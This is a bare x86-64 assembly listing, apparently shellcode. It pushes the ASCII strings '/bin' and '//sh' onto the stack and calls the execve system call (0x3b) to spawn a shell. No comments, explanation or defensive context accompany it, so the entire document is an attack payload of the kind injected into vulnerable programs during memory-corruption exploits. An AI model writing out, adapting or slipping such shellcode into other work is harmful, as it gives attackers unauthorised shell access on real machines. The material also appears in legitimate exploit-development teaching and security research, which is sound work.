section .text
global _start

_start:
	xor rax, rax 
	push rax
	xor rsi, rsi 
	push rbx
	mov rbx, 0x6e69622f
	mov [rsp], rbx
	mov rbx, 0x68732f2f
	mov [rsp+4], rbx
	push rsp 
	pop rdi 
	pop rbx 
	pop rsi
	xor rdx, rdx
	mov al, 0x3b
	syscall
